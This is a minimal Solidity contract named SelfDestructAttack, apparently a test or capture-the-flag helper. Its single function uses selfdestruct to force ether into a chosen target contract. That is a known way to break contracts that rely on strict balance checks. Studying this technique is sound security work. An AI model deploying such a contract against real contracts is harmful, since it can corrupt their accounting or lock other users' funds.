// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract SelfDestructAttack {
    function attack(address target) external payable {
        selfdestruct(payable(target));
    }
}
